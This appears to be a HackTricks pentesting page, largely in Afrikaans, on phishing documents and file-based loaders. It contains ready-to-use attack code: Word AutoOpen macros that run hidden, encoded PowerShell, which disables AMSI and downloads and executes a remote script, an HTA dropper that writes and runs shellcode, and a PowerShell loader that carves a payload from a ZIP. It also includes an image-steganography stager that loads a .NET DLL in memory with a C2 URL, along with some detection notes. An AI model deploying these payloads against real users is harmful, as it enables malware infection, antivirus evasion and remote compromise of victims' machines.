# Phishing-lêers en -dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-dokumente

Microsoft Word voer lêer-datavalidering uit voordat 'n lêer oopgemaak word. Datavalidering geskied in die vorm van identifikasie van die datastruktuur, teen die OfficeOpenXML-standaard. As enige fout voorkom tydens die identifikasie van die datastruktuur, sal die lêer wat ontleed word nie oopgemaak word nie.

Gewoonlik gebruik Word-lêers wat macros bevat die `.docm`-uitbreiding. Dit is egter moontlik om die lêer te hernoem deur die lêeruitbreiding te verander en steeds hul macro-uitvoeringsvermoëns te behou.\
Byvoorbeeld, 'n RTF-lêer ondersteun nie macros nie, per ontwerp, maar 'n DOCM-lêer wat na RTF hernoem is, sal deur Microsoft Word hanteer word en in staat wees tot macro-uitvoering.\
Dieselfde interne meganika en meganismes geld vir alle sagteware van die Microsoft Office Suite (Excel, PowerPoint etc.).

Jy kan die volgende opdrag gebruik om te kontroleer watter uitbreidings deur sommige Office-programme uitgevoer gaan word:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-lêers wat na 'n afgeleë sjabloon verwys (File –Options –Add-ins –Manage: Templates –Go) wat makros bevat, kan ook makros “uitvoer”.

### Eksterne beeldlading

Gaan na: _Insert --> Quick Parts --> Field_\
_**Kategorieë**: Links and References, **Veldname**: includePicture, and **Lêernaam of URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Makro-agterdeur

Dit is moontlik om makros te gebruik om willekeurige kode vanaf die dokument uit te voer.

#### Autoload-funksies

Hoe algemener hulle is, hoe meer waarskynlik sal AV hulle opspoor.

- AutoOpen()
- Document_Open()

#### Makro-kodevoorbeelde
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Verwyder metadata handmatig

Gaan na **File > Info > Inspect Document > Inspect Document**, wat die Document Inspector oopmaak. Klik **Inspect** en daarna **Remove All** langs **Document Properties and Personal Information**.

#### Doc Extension

Wanneer klaar, kies die **Save as type** aftreklys en verander die formaat van **`.docx`** na **Word 97-2003 `.doc`**.\
Doen dit omdat jy **can't save macro's inside a `.docx`** en daar 'n **stigma** **around** die macro-enabled **`.docm`** uitbreiding is (bv. die miniatuur-ikoon het 'n groot `!` en sommige web/email gateways blokkeer hulle heeltemal). Daarom is hierdie **legacy `.doc` extension die beste kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

'n HTA is 'n Windows-program wat **HTML en skriptsprake (soos VBScript en JScript)** kombineer. Dit genereer die gebruikerskoppelvlak en voer uit as 'n "ten volle vertroude" toepassing, sonder die beperkinge van 'n blaaier se sekuriteitsmodel.

'n HTA word uitgevoer deur **`mshta.exe`**, wat gewoonlik **geïnstalleer** is saam met **Internet Explorer**, wat **`mshta` afhanklik van IE** maak. As dit verwyder is, sal HTAs nie uitgevoer kan word nie.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Afdwing van NTLM-outentisering

Daar is verskeie maniere om NTLM-outentisering "op afstand" af te dwing, byvoorbeeld, jy kan **onnsigbare beelde** by e-posse of HTML voeg waarna die gebruiker sal toegang kry (selfs HTTP MitM?). Of stuur die slagoffer die **adres van lêers** wat 'n **outentisering** sal **aktiveer** net deur **die vouer te open.**

**Kyk na hierdie idees en meer op die volgende bladsye:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Moenie vergeet dat jy nie net die hash of die outentisering kan steel nie — jy kan ook **NTLM relay attacks** uitvoer:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Baie effektiewe veldtogte lewer 'n ZIP wat twee wettige lokdokumente (PDF/DOCX) en 'n kwaadwillige .lnk bevat. Die truuk is dat die werklike PowerShell-loader binne die rou bytes van die ZIP ná 'n unieke merker gestoor word, en die .lnk dit uitkerf en volledig in geheue uitvoer.

Tipiese vloei geïmplementeer deur die .lnk PowerShell one-liner:

1) Lokaliseer die oorspronklike ZIP in algemene paaie: Desktop, Downloads, Documents, %TEMP%, %ProgramData% en die ouer van die huidige werkgids.
2) Lees die ZIP-bytes en vind 'n hardgekodeerde merker (bv. xFIQCV). Alles ná die merker is die ingeslote PowerShell payload.
3) Kopieer die ZIP na %ProgramData%, pak dit daar uit, en open die lok .docx om wettig te lyk.
4) Omseil AMSI vir die huidige proses: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskeer die volgende fase (bv. verwyder alle # karakters) en voer dit in geheue uit.

Voorbeeld PowerShell-skelet om die ingeslote fase uit te kerf en uit te voer:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Aantekeninge
- Aflewering misbruik dikwels bekende PaaS-subdomeine (bv., *.herokuapp.com) en kan payloads afskerm (bedien goedaardige ZIPs gebaseer op IP/UA).
- Die volgende fase ontsleutsel dikwels base64/XOR shellcode en voer dit uit via Reflection.Emit + VirtualAlloc om skyf-artefakte te minimaliseer.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. Sien besonderhede en gereed-vir-gebruik kommando's hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-lêers wat die ASCII-merkerstring (bv., xFIQCV) bevat wat aan die argiefdata aangeheg is.
- .lnk wat ouer-/gebruikerlêergidse opsom om die ZIP te vind en 'n lokdokument open.
- AMSI-manipulasie via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlopende sake-drade wat eindig met skakels wat onder vertroude PaaS-domeine gehuisves word.

## Steganography-delimited payloads in images (PowerShell stager)

Onlangse loader chains lewer 'n versluierde JavaScript/VBS wat 'n Base64 PowerShell stager dekodeer en uitvoer. Daardie stager laai 'n beeld af (gereeld GIF) wat 'n Base64-gekodeerde .NET DLL bevat, versteek as platte teks tussen unieke begin-/eind-merkers. Die script soek na hierdie afskeidingsmerkers (voorbeeld in die veld: «<<sudo_png>> … <<sudo_odt>>>»), onttrek die tussen-tekst, dekodeer dit van Base64 na bytes, laai die assembly in-memory en roep 'n bekende entry method aan met die C2 URL.

Werkvloei
- Stage 1: Archived JS/VBS dropper → dekodeer ingebedde Base64 → loods PowerShell stager met -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → laai 'n beeld af, kerf merker-afgebakende Base64 uit, laai die .NET DLL in-memory en roep sy metode aan (bv., VAI) en gee die C2 URL en opsies deur.
- Stage 3: Loader haal finale payload op en spuit dit gewoonlik via process hollowing in 'n vertroude binêre (dikwels MSBuild.exe). Sien meer oor process hollowing en trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-voorbeeld om 'n DLL uit 'n beeld te kerf en 'n .NET-metode in-memory aan te roep:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Aantekeninge
- This is ATT&CK T1027.003 (steganography/marker-hiding). Merkers verskil tussen veldtogte.
- AMSI/ETW bypass en string deobfuscation word gewoonlik toegepas voordat die assembly gelaai word.
- Opsporing: skandeer afgelaaide beelde vir bekende delimiters; identifiseer PowerShell wat beelde benader en onmiddellik Base64 blobs dekodeer.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeletlogika (abstrak):
- Lees eie lêerinhoud
- Vind 'n Base64 blob tussen rommelstrings
- Dekodeer na ASCII PowerShell
- Voer uit met `wscript.exe`/`cscript.exe` wat `powershell.exe` aanroep

Opsporingswenke
- Gearchiveerde JS/VBS-aanhangsels wat `powershell.exe` laat ontstaan met `-enc`/`FromBase64String` in die opdragreël.
- `wscript.exe` wat `powershell.exe -nop -w hidden` vanaf gebruiker-temp-paaie loods.

## Windows files to steal NTLM hashes

Kyk na die bladsy oor **plekke om NTLM creds te steel**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
